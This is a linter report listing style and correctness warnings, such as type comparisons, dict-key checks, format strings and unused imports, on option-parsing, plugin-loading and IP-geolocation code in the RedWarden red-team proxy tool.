560 |         elif type(v) == tuple or type(v) == list:
    |              ^^^^^^^^^^^^^^^^
561 |             for w in v:
562 |                 values.extend(IPGeolocationDeterminant.getValues(w, n + 1))
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:560:34
    |
558 |         elif type(v) == int or type(v) == float:
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |                                  ^^^^^^^^^^^^^^^
561 |             for w in v:
562 |                 values.extend(IPGeolocationDeterminant.getValues(w, n + 1))
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:563:14
    |
561 |             for w in v:
562 |                 values.extend(IPGeolocationDeterminant.getValues(w, n + 1))
563 |         elif type(v) == dict and n < 10:
    |              ^^^^^^^^^^^^^^^
564 |             values.extend(IPGeolocationDeterminant.getValuesDict(v, n + 1))
    |

B007 Loop control variable `k` not used within loop body
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:572:13
    |
570 |         values = []
571 |
572 |         for k, v in data.items():
    |             ^
573 |             if type(v) == dict and n < 10:
574 |                 values.extend(IPGeolocationDeterminant.getValuesDict(v, n + 1))
    |
help: Rename unused `k` to `_k`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:573:16
    |
572 |         for k, v in data.items():
573 |             if type(v) == dict and n < 10:
    |                ^^^^^^^^^^^^^^^
574 |                 values.extend(IPGeolocationDeterminant.getValuesDict(v, n + 1))
575 |             elif n < 10:
    |

N803 Argument name `ipLookupDetails` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:581:15
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |               ^^^^^^^^^^^^^^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |

N803 Argument name `bannedAgents` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:581:32
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |                                ^^^^^^^^^^^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |

N803 Argument name `overrideBannedAgents` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:581:46
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:581:67
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |                                                                   ^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |
help: Replace with `None`; initialize within function

C414 Unnecessary `list()` call within `set()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:586:17
    |
584 |               return (True, "")
585 |
586 |           words = set(
    |  _________________^
587 | |             list(filter(None, IPGeolocationDeterminant.getValuesDict(ipLookupDetails)))
588 | |         )
    | |_________^
589 |           if len(words) == 0:
590 |               return (True, "")
    |
help: Remove the inner `list()` call

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:639:25
    |
637 |                         return (False, w)
638 |
639 |         self.logger.dbg(f"Peer's IP Geolocation metadata didn't raise any suspicion.")
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
640 |         return (True, "")
    |
help: Remove extraneous `f` prefix

F821 Undefined name `self`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:684:17
    |
682 |                 config = yaml.load(f, Loader=yaml.FullLoader)
683 |             except Exception as e:
684 |                 self.logger.fatal(f"Could not parse {f} YAML file:\n\n{e}\n\n")
    |                 ^^^^
685 |
686 |         deter = IPGeolocationDeterminant(logger, config["ip_geolocation_requirements"])
    |

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:254:13
    |
252 |       if opts["list_plugins"]:
253 |           files = sorted(
254 | /             [
255 | |                 f
256 | |                 for f in os.scandir(
257 | |                     os.path.join(
258 | |                         os.path.dirname(os.path.realpath(__file__)), "../plugins/"
259 | |                     )
260 | |                 )
261 | |             ],
    | |_____________^
262 |               key=lambda f: f.name,
263 |           )
    |
help: Rewrite using `list()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:270:23
    |
268 |                 and entry.name.lower() not in ["iproxyplugin.py", "__init__.py"]
269 |             ):
270 |                 print("[+] Plugin: {}".format(entry.name))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
271 |
272 |         sys.exit(0)
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:274:26
    |
272 |         sys.exit(0)
273 |
274 |     if opts["plugin"] != None and len(opts["plugin"]) > 0:
    |                          ^^^^
275 |         for i, opt in enumerate(opts["plugin"]):
276 |             decomposed = PluginsLoader.decompose_path(opt)
    |
help: Replace with `cond is not None`

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:275:13
    |
274 |     if opts["plugin"] != None and len(opts["plugin"]) > 0:
275 |         for i, opt in enumerate(opts["plugin"]):
    |             ^
276 |             decomposed = PluginsLoader.decompose_path(opt)
277 |             if not os.path.isfile(decomposed["path"]):
    |
help: Rename unused `i` to `_i`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:282:25
    |
280 |                     os.path.join(
281 |                         os.path.dirname(os.path.realpath(__file__)),
282 |                         "../plugins/{}.py".format(opt),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
283 |                     )
284 |                 )
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:287:25
    |
285 |                 if not os.path.isfile(opt2):
286 |                     raise Exception(
287 |                         'Specified plugin: "%s" does not exist.' % decomposed["path"]
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
288 |                     )
289 |                 else:
    |
help: Replace with format specifiers

F841 Local variable `f` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:302:48
    |
300 |         try:
301 |             if not os.path.isfile(opts["log"]):
302 |                 with open(opts["log"], "w") as f:
    |                                                ^
303 |                     pass
304 |             opts["log"] = opts["log"]
    |
help: Remove assignment to unused variable `f`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:307:13
    |
306 |           except Exception as e:
307 | /             raise Exception(
308 | |                 '[ERROR] Failed to open log file for writing. Error: "%s"' % e
309 | |             )
    | |_____________^
310 |       else:
311 |           opts["log"] = sys.stdout
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:308:17
    |
306 |         except Exception as e:
307 |             raise Exception(
308 |                 '[ERROR] Failed to open log file for writing. Error: "%s"' % e
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
309 |             )
310 |     else:
    |
help: Replace with format specifiers

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:325:5
    |
323 |           opts["certkey"] = os.path.normpath(opts["certkey"])
324 |
325 | /     if "redelk_backend_name_c2" in opts.keys():
326 | |         if not opts["redelk_backend_name_c2"].startswith("c2"):
    | |_______________________________________________________________^
327 |               raise Exception(
328 |                   '[ERROR] redelk_backend_name_c2 option must start with "c2"!'
    |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:325:8
    |
323 |         opts["certkey"] = os.path.normpath(opts["certkey"])
324 |
325 |     if "redelk_backend_name_c2" in opts.keys():
    |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
326 |         if not opts["redelk_backend_name_c2"].startswith("c2"):
327 |             raise Exception(
    |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:331:5
    |
329 |               )
330 |
331 | /     if "redelk_backend_name_decoy" in opts.keys():
332 | |         if not opts["redelk_backend_name_decoy"].startswith("decoy"):
    | |_____________________________________________________________________^
333 |               raise Exception(
334 |                   '[ERROR] redelk_backend_name_decoy option must start with "decoy"!'
    |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:331:8
    |
329 |             )
330 |
331 |     if "redelk_backend_name_decoy" in opts.keys():
    |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
332 |         if not opts["redelk_backend_name_decoy"].startswith("decoy"):
333 |             raise Exception(
    |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:337:5
    |
335 |               )
336 |
337 | /     if (
338 | |         "redelk_backend_name_c2" in opts.keys()
339 | |         and "redelk_backend_name_decoy" in opts.keys()
340 | |     ):
341 | |         if (
342 | |             opts["redelk_backend_name_c2"].find(" ") != -1
343 | |             or opts["redelk_backend_name_decoy"].find(" ") != -1
344 | |         ):
    | |__________^
345 |               raise Exception(
346 |                   "[ERROR] redelk_backend_name_c2 and redelk_backend_name_decoy options cannot contain spaces!"
    |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:338:9
    |
337 |     if (
338 |         "redelk_backend_name_c2" in opts.keys()
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
339 |         and "redelk_backend_name_decoy" in opts.keys()
340 |     ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:339:13
    |
337 |     if (
338 |         "redelk_backend_name_c2" in opts.keys()
339 |         and "redelk_backend_name_decoy" in opts.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
340 |     ):
341 |         if (
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:349:8
    |
347 |             )
348 |
349 |     if "profile" in opts.keys() and opts["profile"] != None:
    |        ^^^^^^^^^^^^^^^^^^^^^^^^
350 |         profile = opts["profile"]
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:349:56
    |
347 |             )
348 |
349 |     if "profile" in opts.keys() and opts["profile"] != None:
    |                                                        ^^^^
350 |         profile = opts["profile"]
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:354:17
    |
352 |         if (
353 |             not os.path.isfile(profile)
354 |             and "config" in opts.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^
355 |             and os.path.isfile(opts["config"])
356 |         ):
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:369:23
    |
368 |             if os.path.isfile(p):
369 |                 print('[.] Found Malleable C2 profile at: "{}"'.format(p))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
370 |                 opts["profile"] = p
    |
help: Convert to f-string

N806 Variable `parametersRequiringDirectPath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:374:5
    |
373 | def parseParametersFromConfigFile(_params):
374 |     parametersRequiringDirectPath = (
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
375 |         "log",
376 |         "output",
    |

N806 Variable `parametersWithPathThatMayNotExist` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:388:5
    |
386 |     )
387 |
388 |     parametersWithPathThatMayNotExist = ("log", "output", "access_log", "ssl_certdir")
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
389 |
390 |     translateParamNames = {
    |

N806 Variable `translateParamNames` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:390:5
    |
388 |     parametersWithPathThatMayNotExist = ("log", "output", "access_log", "ssl_certdir")
389 |
390 |     translateParamNames = {
    |     ^^^^^^^^^^^^^^^^^^^
391 |         "output": "log",
392 |         "proxy_url": "proxy_self_url",
    |

N806 Variable `valuesThatNeedsToBeList` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:411:5
    |
409 |     }
410 |
411 |     valuesThatNeedsToBeList = (
    |     ^^^^^^^^^^^^^^^^^^^^^^^
412 |         "port",
413 |         "plugin",
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:418:5
    |
416 |     outparams = vars(_params)
417 |     config = {}
418 |     configBasePath = ""
    |     ^^^^^^^^^^^^^^
419 |
420 |     if outparams["config"] != None and len(outparams["config"]) > 0:
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:420:31
    |
418 |     configBasePath = ""
419 |
420 |     if outparams["config"] != None and len(outparams["config"]) > 0:
    |                               ^^^^
421 |         if not "config" in outparams.keys() or not os.path.isfile(outparams["config"]):
422 |             raise Exception(
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:421:16
    |
420 |     if outparams["config"] != None and len(outparams["config"]) > 0:
421 |         if not "config" in outparams.keys() or not os.path.isfile(outparams["config"]):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
422 |             raise Exception(
423 |                 f'RedWarden config file not found: ({outparams["config"]}) or --config not specified!'
    |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:421:16
    |
420 |     if outparams["config"] != None and len(outparams["config"]) > 0:
421 |         if not "config" in outparams.keys() or not os.path.isfile(outparams["config"]):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
422 |             raise Exception(
423 |                 f'RedWarden config file not found: ({outparams["config"]}) or --config not specified!'
    |
help: Convert to `not in`

F821 Undefined name `self`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:433:17
    |
431 |                 config = yaml.load(f, Loader=yaml.FullLoader)
432 |             except Exception as e:
433 |                 self.logger.fatal(f"Could not parse {f} YAML file:\n\n{e}\n\n")
    |                 ^^^^
434 |
435 |         outparams.update(config)
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:438:16
    |
437 |         for val in valuesThatNeedsToBeList:
438 |             if val in outparams.keys() and val in config.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^
439 |                 if type(config[val]) == str:
440 |                     outparams[val] = [
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:438:44
    |
437 |         for val in valuesThatNeedsToBeList:
438 |             if val in outparams.keys() and val in config.keys():
    |                                            ^^^^^^^^^^^^^^^^^^^^
439 |                 if type(config[val]) == str:
440 |                     outparams[val] = [
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:439:20
    |
437 |         for val in valuesThatNeedsToBeList:
438 |             if val in outparams.keys() and val in config.keys():
439 |                 if type(config[val]) == str:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^
440 |                     outparams[val] = [
441 |                         config[val],
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:447:16
    |
446 |         for k, v in ProxyOptionsDefaultValues.items():
447 |             if k not in outparams.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^
448 |                 outparams[k] = v
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:451:16
    |
450 |         for k, v in translateParamNames.items():
451 |             if k in outparams.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^
452 |                 outparams[v] = outparams[k]
453 |             if v in outparams.keys():
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:453:16
    |
451 |             if k in outparams.keys():
452 |                 outparams[v] = outparams[k]
453 |             if v in outparams.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^
454 |                 outparams[k] = outparams[v]
    |
help: Remove `.keys()`

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:456:9
    |
454 |                 outparams[k] = outparams[v]
455 |
456 |         configBasePath = os.path.dirname(os.path.abspath(outparams["config"]))
    |         ^^^^^^^^^^^^^^
457 |
458 |         for paramName in parametersRequiringDirectPath:
    |

N806 Variable `paramName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:458:13
    |
456 |         configBasePath = os.path.dirname(os.path.abspath(outparams["config"]))
457 |
458 |         for paramName in parametersRequiringDirectPath:
    |             ^^^^^^^^^
459 |             if (
460 |                 paramName in outparams.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:460:17
    |
458 |         for paramName in parametersRequiringDirectPath:
459 |             if (
460 |                 paramName in outparams.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
461 |                 and outparams[paramName] != ""
462 |                 and outparams[paramName] != None
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:462:45
    |
460 |                 paramName in outparams.keys()
461 |                 and outparams[paramName] != ""
462 |                 and outparams[paramName] != None
    |                                             ^^^^
463 |             ):
464 |                 p1 = outparams[paramName]
    |
help: Replace with `cond is not None`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:486:33
    |
484 |         return outparams
485 |
486 |     except FileNotFoundError as e:
    |                                 ^
487 |         raise Exception(f'RedWarden config file not found: ({outparams["config"]})!')
    |
help: Remove assignment to unused variable `e`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:487:9
    |
486 |     except FileNotFoundError as e:
487 |         raise Exception(f'RedWarden config file not found: ({outparams["config"]})!')
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
488 |
489 |     except Exception as e:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:490:9
    |
489 |       except Exception as e:
490 | /         raise Exception(
491 | |             f"Unhandled exception occured while parsing RedWarden config file: {e}"
492 | |         )
    | |_________^
493 |
494 |       return outparams
    |

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:501:9
    |
499 |       plugins = []
500 |       files = sorted(
501 | /         [
502 | |             f
503 | |             for f in os.scandir(
504 | |                 os.path.join(os.path.dirname(os.path.realpath(__file__)), "../plugins/")
505 | |             )
506 | |         ],
    | |_________^
507 |           key=lambda f: f.name,
508 |       )
    |
help: Rewrite using `list()`

F841 Local variable `plugin_own_options` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:522:5
    |
520 |     options["debug"] = False
521 |
522 |     plugin_own_options = {}
    |     ^^^^^^^^^^^^^^^^^^
523 |
524 |     pl = PluginsLoader(logger, options)
    |
help: Remove assignment to unused variable `plugin_own_options`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:526:20
    |
524 |     pl = PluginsLoader(logger, options)
525 |     for name, plugin in pl.get_plugins().items():
526 |         logger.dbg("Fetching plugin {} options.".format(name))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
527 |         if hasattr(plugin, "help"):
528 |             plugin_options = parser.add_argument_group(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\optionsparser.py:529:17
    |
527 |         if hasattr(plugin, "help"):
528 |             plugin_options = parser.add_argument_group(
529 |                 "Plugin '{}' options".format(plugin.get_name())
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
530 |             )
531 |             plugin.help(plugin_options)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:21:20
   |
20 |         def _text(self, txt):
21 |             return "[{}] {}".format(self.name, txt)
   |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 |         # Info shall be used as an ordinary logging facility, for every desired output.
   |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:51:17
   |
49 |         if plugins_count > 0:
50 |             self.logger.info(
51 |                 "Loading %d plugin%s..."
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^
52 |                 % (plugins_count, "" if plugins_count == 1 else "s")
53 |             )
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:97:25
   |
95 |         instance = None
96 |
97 |         self.logger.dbg('Plugin string: "%s"' % path)
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
98 |         decomposed = PluginsLoader.decompose_path(path)
99 |         self.logger.dbg("Decomposed as: %s" % str(decomposed))
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:99:25
    |
 97 |         self.logger.dbg('Plugin string: "%s"' % path)
 98 |         decomposed = PluginsLoader.decompose_path(path)
 99 |         self.logger.dbg("Decomposed as: %s" % str(decomposed))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
100 |
101 |         plugin = decomposed["path"].strip()
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:105:57
    |
103 |         if not os.path.isfile(plugin):
104 |             _plugin = os.path.normpath(
105 |                 os.path.join(os.path.dirname(__file__), "../plugins/{}".format(plugin))
    |                                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
106 |             )
107 |             if os.path.isfile(_plugin):
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:118:25
    |
116 |             return
117 |
118 |         self.logger.dbg('Attempting to load plugin: %s ("%s")...' % (name, plugin))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
119 |
120 |         try:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:144:33
    |
142 |                     instance = handler
143 |
144 |                 self.logger.dbg('Found class "%s".' % self.options["plugin_class_name"])
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
145 |
146 |             except AttributeError as e:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:148:21
    |
146 |               except AttributeError as e:
147 |                   self.logger.err(
148 | /                     'Plugin "%s" loading has failed: "%s".'
149 | |                     % (name, self.options["plugin_class_name"])
    | |_______________________________________________________________^
150 |                   )
151 |                   self.logger.err("\tError: %s" % e)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:151:33
    |
149 |                     % (name, self.options["plugin_class_name"])
150 |                 )
151 |                 self.logger.err("\tError: %s" % e)
    |                                 ^^^^^^^^^^^^^^^^^
152 |                 if self.options["debug"]:
153 |                     raise
    |
help: Replace with format specifiers

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:155:33
    |
153 |                     raise
154 |
155 |             except TypeError as e:
    |                                 ^
156 |                 self.logger.err(
157 |                     'Plugin "{}" instantiation failed due to interface incompatibility.'.format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:157:21
    |
155 |               except TypeError as e:
156 |                   self.logger.err(
157 | /                     'Plugin "{}" instantiation failed due to interface incompatibility.'.format(
158 | |                         name
159 | |                     )
    | |_____________________^
160 |                   )
161 |                   raise
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:164:33
    |
163 |             if not instance:
164 |                 self.logger.err('Didn\'t find supported class in module "%s"' % name)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
165 |             else:
166 |                 self.plugins[name] = instance
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:167:34
    |
165 |             else:
166 |                 self.plugins[name] = instance
167 |                 self.logger.info('Plugin "%s" has been installed.' % name)
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
168 |
169 |         except ImportError as e:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\pluginsloader.py:171:17
    |
169 |         except ImportError as e:
170 |             self.logger.err(
171 |                 'Couldn\'t load specified plugin: "%s". Error: %s' % (plugin, e)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
172 |             )
173 |             if self.options["debug"]:
    |
help: Replace with format specifiers

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
  |
help: Remove unnecessary coding comment

F401 [*] `threading` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:17:8
   |
15 | import string
16 | import sys
17 | import threading
   |        ^^^^^^^^^
18 | import time
19 | import traceback
   |
help: Remove unused import: `threading`

F401 [*] `traceback` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:19:8
   |
17 | import threading
18 | import time
19 | import traceback
   |        ^^^^^^^^^
20 | import zlib
21 | from datetime import datetime
   |
help: Remove unused import: `traceback`

F401 [*] `html.parser.HTMLParser` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:22:25
   |
20 | import zlib
21 | from datetime import datetime
22 | from html.parser import HTMLParser
   |                         ^^^^^^^^^^
23 | from http.server import BaseHTTPRequestHandler
24 | from io import BytesIO, StringIO
   |
help: Remove unused import: `html.parser.HTMLParser`

F401 [*] `http.server.BaseHTTPRequestHandler` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:23:25
   |
21 | from datetime import datetime
22 | from html.parser import HTMLParser
23 | from http.server import BaseHTTPRequestHandler
   |                         ^^^^^^^^^^^^^^^^^^^^^^
24 | from io import BytesIO, StringIO
25 | from subprocess import PIPE, Popen
   |
help: Remove unused import: `http.server.BaseHTTPRequestHandler`

